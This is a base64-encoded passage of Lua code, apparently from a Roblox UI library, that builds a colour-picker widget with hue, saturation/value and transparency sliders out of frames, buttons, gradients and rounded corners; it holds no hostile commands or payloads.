gewogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiQ29sb3IiLCAKICAgICAgICAgICAgICAgIGZsYWcgPSBvcHRpb25zLmZsYWcgb3IgbGlicmFyeTpuZXh0X2ZsYWcoKSwKCiAgICAgICAgICAgICAgICBjb2xvciA9IG9wdGlvbnMuY29sb3Igb3IgY29sb3IoMSwgMSwgMSksIC0tIERlZmF1bHQgdG8gd2hpdGUgY29sb3IgaWYgbm90IHByb3ZpZGVkCiAgICAgICAgICAgICAgICBhbHBoYSA9IG9wdGlvbnMuYWxwaGEgYW5kIDEgLSBvcHRpb25zLmFscGhhIG9yIDAsCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG9wZW4gPSBmYWxzZSwgCiAgICAgICAgICAgICAgICBjYWxsYmFjayA9IG9wdGlvbnMuY2FsbGJhY2sgb3IgZnVuY3Rpb24oKSBlbmQsCiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwoKICAgICAgICAgICAgICAgIHNlcGVyYXRvciA9IG9wdGlvbnMuc2VwZXJhdG9yIG9yIG9wdGlvbnMuU2VwZXJhdG9yIG9yIGZhbHNlOwogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBkcmFnZ2luZ19zYXQgPSBmYWxzZSAKICAgICAgICAgICAgbG9jYWwgZHJhZ2dpbmdfaHVlID0gZmFsc2UgCiAgICAgICAgICAgIGxvY2FsIGRyYWdnaW5nX2FscGhhID0gZmFsc2UgCgogICAgICAgICAgICBsb2NhbCBoLCBzLCB2ID0gY2ZnLmNvbG9yOlRvSFNWKCkgCiAgICAgICAgICAgIGxvY2FsIGEgPSBjZmcuYWxwaGEgCgogICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ10gPSB7Q29sb3IgPSBjZmcuY29sb3IsIFRyYW5zcGFyZW5jeSA9IGNmZy5hbHBoYX0KCiAgICAgICAgICAgIGxvY2FsIGxhYmVsOyAKICAgICAgICAgICAgaWYgbm90IHNlbGYuaXRlbXMucmlnaHRfY29tcG9uZW50cyB0aGVuIAogICAgICAgICAgICAgICAgbGFiZWwgPSBzZWxmOmxhYmVsKHtuYW1lID0gY2ZnLm5hbWUsIHNlcGVyYXRvciA9IGNmZy5zZXBlcmF0b3J9KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIC0tIENvbXBvbmVudAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGFiZWwgYW5kIGxhYmVsLml0ZW1zLnJpZ2h0X2NvbXBvbmVudHMgb3Igc2VsZi5pdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDE2LCAwLCAxNik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoNTQsIDMxLCAxODQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXJfaW5saW5lIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sb3JwaWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJNb2RlID0gRW51bS5Cb3JkZXJNb2RlLkluc2V0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYig1NCwgMzEsIDE4NCkKICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTY2FsZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9pbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgU2NhbGUgPSBzY2FsZTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbG9ycGlja2VyX2lubGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUdyYWRpZW50IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2JzZXF7cmdia2V5KDAsIHJnYigyMTEsIDIxMSwgMjExKSksIHJnYmtleSgxLCByZ2IoMjExLCAyMTEsIDIxMSkpfTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9pbmxpbmUiIF0KICAgICAgICAgICAgICAgICAgICB9KTsgICAgICAgICAKICAgICAgICAgICAgICAgIC0tCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIENvbG9ycGlja2VyCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJjb2xvcnBpY2tlcl9ob2xkZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeVsgIm90aGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAuMjAwMDAwMDAyOTgwMjMyMjQsIDIwLCAwLjI5Njk5OTk5MDk0MDA5NCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMTY2LCAwLCAxOTcpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBWaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNSwgMjUsIDI5KQogICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImNvbG9ycGlja2VyX2ZhZGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAxMDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjUsIDI1LCAyOSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImNvbG9ycGlja2VyX2NvbXBvbmVudHMiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIsIDEsIC0yKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyMiwgMjIsIDI0KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbG9ycGlja2VyX2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA2KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDcsIDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xNCwgMSwgLTgwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDM5LCAzOSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInNhdCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAyOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2F0IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJR3JhZGllbnQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBSb3RhdGlvbiA9IDI3MDsKICAgICAgICAgICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gbnVtc2Vxe251bWtleSgwLCAwKSwgbnVta2V5KDEsIDEpfTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzYXQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdic2Vxe3JnYmtleSgwLCByZ2IoMCwgMCwgMCkpLCByZ2JrZXkoMSwgcmdiKDAsIDAsIDApKX0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInZhbCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzYXR1cmF0aW9uX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidmFsIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBUcmFuc3BhcmVuY3kgPSBudW1zZXF7bnVta2V5KDAsIDApLCBudW1rZXkoMSwgMSl9CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidmFsIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzYXR1cmF0aW9uX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJzYXR2YWxwaWNrZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzYXR1cmF0aW9uX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCA0LCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgOCwgMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFpJbmRleCA9IDU7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAwLCAwKQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNhdHZhbHBpY2tlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDk5OTkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVN0cm9rZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNhdHZhbHBpY2tlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQXBwbHlTdHJva2VNb2RlID0gRW51bS5BcHBseVN0cm9rZU1vZGUuQm9yZGVyOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2xvcnBpY2tlcl9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAxLCAtNjQpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yMCwgMCwgOCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUdyYWRpZW50IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2JzZXF7cmdia2V5KDAsIHJnYigyNTUsIDAsIDApKSwgcmdia2V5KDAuMTcsIHJnYigyNTUsIDI1NSwgMCkpLCByZ2JrZXkoMC4zMywgcmdiKDAsIDI1NSwgMCkpLCByZ2JrZXkoMC41LCByZ2IoMCwgMjU1LCAyNTUpKSwgcmdia2V5KDAuNjcsIHJnYigwLCAwLCAyNTUpKSwgcmdia2V5KDAuODMsIHJnYigyNTUsIDAsIDI1NSkpLCByZ2JrZXkoMSwgcmdiKDI1NSwgMCwgMCkpfTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJodWVfZ3JhZGllbnQiIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJodWVfZ3JhZGllbnQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA2KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaHVlX3BpY2tlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDAuNSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDgsIDAsIDgpOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSA1OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMCwgMCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJodWVfcGlja2VyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5OSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJU3Ryb2tlIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaHVlX3BpY2tlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQXBwbHlTdHJva2VNb2RlID0gRW51bS5BcHBseVN0cm9rZU1vZGUuQm9yZGVyOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbG9ycGlja2VyX2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMTAsIDEsIC00Nik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIwLCAwLCA4KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNSwgMjUsIDI5KTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJhbHBoYV9ncmFkaWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDYpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJhbHBoYV9waWNrZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAwLjUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImFscGhhX2dyYWRpZW50IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAuNSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDgsIDAsIDgpOwogICAgICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSA1OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMCwgMCkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJhbHBoYV9waWNrZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTk5KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICAgICAgQXBwbHlTdHJva2VNb2RlID0gRW51bS5BcHBseVN0cm9rZU1vZGUuQm9yZGVyOwo